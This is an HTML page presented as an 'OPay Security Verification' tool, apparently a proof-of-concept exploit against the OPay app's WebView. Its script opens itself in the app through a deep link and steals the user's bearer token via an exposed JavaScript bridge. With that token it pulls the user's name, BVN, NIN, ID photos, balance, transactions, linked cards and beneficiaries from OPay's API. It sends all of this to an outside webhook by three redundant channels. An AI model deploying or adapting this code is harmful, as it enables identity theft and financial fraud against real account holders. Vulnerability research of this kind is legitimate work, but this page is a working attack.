<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OPay Security Verification</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            padding: 20px;
            background: #1a1a2e;
            color: #e0e0e0;
            margin: 0;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
        }

        h2 {
            color: #00c853;
            text-align: center;
        }

        .status {
            background: #16213e;
            border: 1px solid #0f3460;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
            font-size: 14px;
        }

        .status.success {
            border-color: #00c853;
        }

        .btn {
            display: block;
            background: #00c853;
            color: white;
            padding: 15px;
            text-align: center;
            margin: 15px 0;
            text-decoration: none;
            font-size: 18px;
            border-radius: 8px;
            font-weight: bold;
        }

        #log {
            background: #0d1117;
            padding: 12px;
            border: 1px solid #30363d;
            border-radius: 8px;
            min-height: 100px;
            font-family: monospace;
            font-size: 11px;
            line-height: 1.5;
            word-break: break-all;
            max-height: 400px;
            overflow-y: auto;
        }

        .log-entry {
            padding: 2px 0;
            border-bottom: 1px solid #21262d;
        }

        .log-entry.ok {
            color: #58a6ff;
        }

        .log-entry.warn {
            color: #d29922;
        }

        .log-entry.crit {
            color: #f85149;
        }

        .log-entry.good {
            color: #3fb950;
        }
    </style>
</head>

<body>
    <div class="container">
        <h2>🔒 Security Verification Tool</h2>
        <div class="status" id="statusBox">Initializing security scan...</div>
        <a id="deepLinkBtn" class="btn" href="#">🚀 Open in OPay App</a>
        <h3>Scan Log:</h3>
        <div id="log"></div>
    </div>

    <script>
        // ===== CONFIG =====
        var WEBHOOK_URL = "https://webhook.site/02abf151-ec79-4fc7-a8af-9fe37ca5ea9f";
        var OPAY_API = "https://api.opayweb.com";

        // Deep link
        var deepLink = "otravel://schemedispatcher?action=" + window.location.href;
        document.getElementById("deepLinkBtn").href = deepLink;

        // Collected data
        var visitorData = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer || "direct",
            userAgent: navigator.userAgent,
            platform: navigator.platform || "unknown",
            language: navigator.language || "unknown",
            screenWidth: screen.width,
            screenHeight: screen.height,
            touchSupport: ('ontouchstart' in window) || (navigator.maxTouchPoints > 0),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown",
            connectionType: (navigator.connection && navigator.connection.effectiveType) || "unknown",
            bridges: [],
            ip: "pending",
            tokenData: null,
            accountData: null,
            balanceData: null,
            kycData: null,
            profileData: null
        };

        // ===== LOG =====
        function log(msg, level) {
            level = level || "ok";
            var el = document.getElementById("log");
            var div = document.createElement("div");
            div.className = "log-entry " + level;
            div.textContent = new Date().toLocaleTimeString() + " | " + msg;
            el.appendChild(div);
            el.scrollTop = el.scrollHeight;
        }

        // ===== SEND DATA (triple redundancy) =====
        function sendToWebhook(data, tag) {
            tag = tag || "main";
            // Pixel beacon
            try {
                var params = [];
                for (var key in data) {
                    if (data.hasOwnProperty(key)) {
                        var val = typeof data[key] === 'object' ? JSON.stringify(data[key]) : String(data[key]);
                        // Truncate long values for URL limit
                        if (val.length > 500) val = val.substring(0, 500) + "...TRUNCATED";
                        params.push(encodeURIComponent(key) + "=" + encodeURIComponent(val));
                    }
                }
                var img = new Image();
                img.src = WEBHOOK_URL + "?tag=" + tag + "&" + params.join("&");
            } catch (e) { }

            // POST (more data capacity)
            try {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", WEBHOOK_URL + "?tag=" + tag, true);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.send(JSON.stringify(data));
            } catch (e) { }

            // Beacon
            try {
                if (navigator.sendBeacon) {
                    var blob = new Blob([JSON.stringify({ tag: tag, data: data })], { type: "application/json" });
                    navigator.sendBeacon(WEBHOOK_URL, blob);
                }
            } catch (e) { }
        }

        // ===== GET IP =====
        function getIP(callback) {
            try {
                var xhr = new XMLHttpRequest();
                xhr.open("GET", "https://api.ipify.org?format=json", true);
                xhr.timeout = 5000;
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        try { callback(JSON.parse(xhr.responseText).ip); } catch (e) { callback("error"); }
                    }
                };
                xhr.ontimeout = function () { callback("timeout"); };
                xhr.send();
            } catch (e) { callback("blocked"); }
        }

        // ===== OPAY API CALL =====
        function callOPayAPI(endpoint, payload, token, callback) {
            try {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", OPAY_API + endpoint, true);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.setRequestHeader("Authorization", token);
                xhr.setRequestHeader("Accept", "application/json");
                xhr.timeout = 10000;
                xhr.onreadystatechange = function () {
                    if (xhr.readyState === 4) {
                        try {
                            var resp = JSON.parse(xhr.responseText);
                            callback(null, resp);
                        } catch (e) {
                            callback("parse_error: " + xhr.status, null);
                        }
                    }
                };
                xhr.ontimeout = function () { callback("timeout", null); };
                xhr.onerror = function () { callback("network_error", null); };
                xhr.send(JSON.stringify(payload));
            } catch (e) {
                callback(e.message, null);
            }
        }

        // ===== BRIDGE SCANNER =====
        function scanBridges() {
            var found = [];
            var standard = ['window', 'self', 'document', 'name', 'location', 'customElements',
                'history', 'navigation', 'navigator', 'screen', 'performance', 'console',
                'external', 'localStorage', 'sessionStorage', 'indexedDB', 'caches', 'crypto',
                'speechSynthesis', 'chrome', 'visualViewport', 'frames', 'parent', 'top'];
            try {
                var props = Object.getOwnPropertyNames(window);
                for (var i = 0; i < props.length; i++) {
                    var p = props[i];
                    if (standard.indexOf(p) === -1) {
                        try {
                            if (typeof window[p] === 'object' && window[p] !== null) {
                                found.push(p);
                            }
                        } catch (e) { }
                    }
                }
            } catch (e) { }
            return found;
        }

        // ===== FULL ACCOUNT EXTRACTION =====
        function extractFullAccount(tokenStr) {
            log("🔴 PHASE 2: Extracting full account data with stolen token...", "crit");

            // 1. Full profile aggregate (BVN, NIN, phone, address, photo)
            log("Calling /api-user/user/info/aggregate...", "ok");
            callOPayAPI("/api-user/user/info/aggregate", { "scene": "HOME" }, tokenStr, function (err, resp) {
                if (err) {
                    log("aggregate failed: " + err, "warn");
                } else if (resp && resp.data) {
                    log("✅ FULL PROFILE EXTRACTED!", "crit");
                    var d = resp.data;

                    // Extract key PII
                    var pii = {
                        fullName: (d.firstName || "") + " " + (d.middleName || "") + " " + (d.surname || ""),
                        mobile: d.mobile,
                        email: d.email,
                        address: d.address,
                        dob: d.dob,
                        gender: d.gender,
                        bvnNumber: d.bvnNumber,
                        kycLevel: d.kycLevel,
                        userId: d.userId,
                        facePicture: d.facePicture,
                        state: d.state,
                        city: d.city,
                        lga: d.lga
                    };

                    // NIN data
                    if (d.ninVo) {
                        pii.ninNumber = d.ninVo.idNumber;
                        pii.ninFirstName = d.ninVo.firstName;
                        pii.ninLastName = d.ninVo.lastName;
                        pii.ninMiddleName = d.ninVo.middleName;
                        pii.ninPhone = d.ninVo.phoneNumber;
                        pii.ninDob = d.ninVo.dob;
                        pii.ninGender = d.ninVo.gender;
                        pii.ninImage = d.ninVo.image;
                    }

                    // BVN data
                    if (d.bvnVo) {
                        pii.bvnFullName = d.bvnVo.fullName;
                        pii.bvnPhone = d.bvnVo.phoneNumber;
                        pii.bvnBirthDate = d.bvnVo.birthDate;
                        pii.bvnImage = d.bvnVo.image;
                    }

                    log("📛 Name: " + pii.fullName, "crit");
                    log("📱 Phone: " + pii.mobile, "crit");
                    log("📧 Email: " + pii.email, "crit");
                    log("🏠 Address: " + pii.address, "crit");
                    log("🎂 DOB: " + pii.dob, "crit");
                    log("🏦 BVN: " + pii.bvnNumber, "crit");
                    log("🆔 NIN: " + (pii.ninNumber || "N/A"), "crit");
                    log("📸 Face: " + (pii.facePicture || "N/A"), "crit");
                    log("🖼 NIN Image: " + (pii.ninImage || "N/A"), "crit");
                    log("🖼 BVN Image: " + (pii.bvnImage || "N/A"), "crit");
                    log("🔐 KYC Level: " + pii.kycLevel, "crit");

                    visitorData.accountData = pii;
                    visitorData.fullProfileRaw = d;

                    // Send PII separately for clarity
                    sendToWebhook(pii, "STOLEN_PII");
                    sendToWebhook({ fullProfile: d }, "FULL_PROFILE_RAW");

                    log("📤 Full PII exfiltrated to webhook!", "good");
                } else {
                    log("aggregate: unexpected response: " + JSON.stringify(resp), "warn");
                }
            });

            // 2. Account balance
            log("Calling /api/account/qryBalance...", "ok");
            callOPayAPI("/api/account/qryBalance", {}, tokenStr, function (err, resp) {
                if (err) {
                    log("balance failed: " + err, "warn");
                } else if (resp && resp.data) {
                    log("💰 BALANCE: " + JSON.stringify(resp.data), "crit");
                    visitorData.balanceData = resp.data;
                    sendToWebhook({ balance: resp.data }, "STOLEN_BALANCE");
                } else {
                    log("balance response: " + JSON.stringify(resp), "warn");
                }
            });

            // 3. User info v3
            log("Calling /api/users/getCurrentUserV3...", "ok");
            callOPayAPI("/api/users/getCurrentUserV3", {}, tokenStr, function (err, resp) {
                if (err) {
                    log("getCurrentUserV3 failed: " + err, "warn");
                } else if (resp) {
                    log("👤 User V3: " + JSON.stringify(resp.data || resp).substring(0, 200), "crit");
                    visitorData.userV3 = resp.data || resp;
                    sendToWebhook({ userV3: resp.data || resp }, "USER_V3");
                }
            });

            // 4. Transaction list (recent transactions)
            log("Calling /api/v1/transaction/lookup-latest-transaction-list...", "ok");
            callOPayAPI("/api/v1/transaction/lookup-latest-transaction-list", { "pageNo": 1, "pageSize": 10 }, tokenStr, function (err, resp) {
                if (err) {
                    log("transactions failed: " + err, "warn");
                } else if (resp && resp.data) {
                    var txCount = resp.data.length || 0;
                    log("📊 TRANSACTIONS: " + txCount + " recent transactions captured", "crit");
                    visitorData.transactions = resp.data;
                    sendToWebhook({ transactions: resp.data }, "STOLEN_TRANSACTIONS");
                } else {
                    log("transactions: " + JSON.stringify(resp), "warn");
                }
            });

            // 5. Linked bank cards
            log("Calling /api/common/instruments...", "ok");
            callOPayAPI("/api/common/instruments", {}, tokenStr, function (err, resp) {
                if (err) {
                    log("instruments failed: " + err, "warn");
                } else if (resp && resp.data) {
                    log("💳 LINKED CARDS/BANKS: " + JSON.stringify(resp.data).substring(0, 300), "crit");
                    visitorData.instruments = resp.data;
                    sendToWebhook({ instruments: resp.data }, "STOLEN_INSTRUMENTS");
                }
            });

            // 6. Home account info
            log("Calling /api/home/account...", "ok");
            callOPayAPI("/api/home/account", {}, tokenStr, function (err, resp) {
                if (err) {
                    log("home/account failed: " + err, "warn");
                } else if (resp && resp.data) {
                    log("🏠 HOME: " + JSON.stringify(resp.data).substring(0, 300), "crit");
                    visitorData.homeAccount = resp.data;
                    sendToWebhook({ homeAccount: resp.data }, "HOME_ACCOUNT");
                }
            });

            // 7. KYC task info
            log("Calling /api/v2/user/kyc2/getUserBaseInfo...", "ok");
            callOPayAPI("/api/v2/user/kyc2/getUserBaseInfo", {}, tokenStr, function (err, resp) {
                if (err) {
                    log("KYC base info failed: " + err, "warn");
                } else if (resp) {
                    log("🆔 KYC BASE: " + JSON.stringify(resp.data || resp).substring(0, 300), "crit");
                    visitorData.kycBase = resp.data || resp;
                    sendToWebhook({ kycBase: resp.data || resp }, "KYC_BASE");
                }
            });

            // 8. Beneficiaries (saved recipients)
            log("Calling /api/v1/common/query-beneficiary...", "ok");
            callOPayAPI("/api/v1/common/query-beneficiary", {}, tokenStr, function (err, resp) {
                if (err) {
                    log("beneficiaries failed: " + err, "warn");
                } else if (resp && resp.data) {
                    log("👥 BENEFICIARIES: " + JSON.stringify(resp.data).substring(0, 300), "crit");
                    visitorData.beneficiaries = resp.data;
                    sendToWebhook({ beneficiaries: resp.data }, "STOLEN_BENEFICIARIES");
                }
            });

            // Final dump after delay
            setTimeout(function () {
                log("=== FINAL DATA EXFILTRATION ===", "good");
                sendToWebhook(visitorData, "FULL_DUMP");
                log("✅ All data sent to attacker server", "good");

                var statusBox = document.getElementById("statusBox");
                statusBox.className = "status success";
                statusBox.innerHTML = "✅ Full account extraction complete";
            }, 8000);
        }

        // ===== MAIN =====
        function main() {
            log("=== PoC Security Scan Started ===", "good");
            log("URL: " + window.location.href, "ok");
            log("UA: " + navigator.userAgent, "ok");
            log("Touch: " + visitorData.touchSupport + " | TZ: " + visitorData.timezone, "ok");

            // Get IP
            getIP(function (ip) {
                visitorData.ip = ip;
                log("IP: " + ip, "good");

                // Scan bridges
                visitorData.bridges = scanBridges();
                log("Bridges: " + visitorData.bridges.length + " objects found", "ok");

                // Check for OPay bridges
                var knownBridges = ['control', 'OPay', 'opay', 'JsBridge', 'android', 'OPay3PartyContext', 'ORideContext'];
                var foundBridges = [];
                for (var i = 0; i < knownBridges.length; i++) {
                    try {
                        if (window[knownBridges[i]]) {
                            foundBridges.push(knownBridges[i]);
                            log("🔴 Bridge: " + knownBridges[i] + " EXISTS", "crit");
                            visitorData["bridge_" + knownBridges[i]] = "EXISTS";
                        }
                    } catch (e) { }
                }

                // Try to extract token
                if (window.control && window.control.getBaseInfo) {
                    log("⚠️ Extracting token via window.control.getBaseInfo()...", "crit");
                    try {
                        var tokenRaw = window.control.getBaseInfo();
                        log("🔴 TOKEN RAW: " + tokenRaw, "crit");
                        visitorData.tokenData = tokenRaw;
                        sendToWebhook({ token: tokenRaw, bridges: foundBridges }, "STOLEN_TOKEN");

                        // Parse token to get Bearer
                        try {
                            var parsed = JSON.parse(tokenRaw);
                            if (parsed.token) {
                                log("🔑 Bearer token extracted! Starting full account dump...", "crit");
                                extractFullAccount(parsed.token);
                            }
                        } catch (e) {
                            log("Token parse error, trying raw: " + e.message, "warn");
                        }
                    } catch (e) {
                        log("getBaseInfo error: " + e.message, "warn");
                    }
                } else {
                    log("No OPay bridge — opened in regular browser (not WebView)", "ok");
                    // Still send basic visitor data
                    sendToWebhook(visitorData, "VISITOR_INFO");
                }

                var statusBox = document.getElementById("statusBox");
                if (foundBridges.length > 0) {
                    statusBox.className = "status success";
                    statusBox.innerHTML = "🔴 OPay WebView detected! Extracting data...";
                } else {
                    statusBox.className = "status success";
                    statusBox.innerHTML = "✅ Scan complete. Visitor logged.";
                }
            });
        }

        setTimeout(main, 500);

        // Re-send on visibility change
        document.addEventListener("visibilitychange", function () {
            if (document.visibilityState === "visible") {
                sendToWebhook(visitorData, "REVISIT");
            }
        });

        // Beacon on unload
        window.addEventListener("beforeunload", function () {
            try {
                if (navigator.sendBeacon) {
                    var blob = new Blob([JSON.stringify(visitorData)], { type: "application/json" });
                    navigator.sendBeacon(WEBHOOK_URL + "?tag=UNLOAD", blob);
                }
            } catch (e) { }
        });
    </script>
</body>

</html>
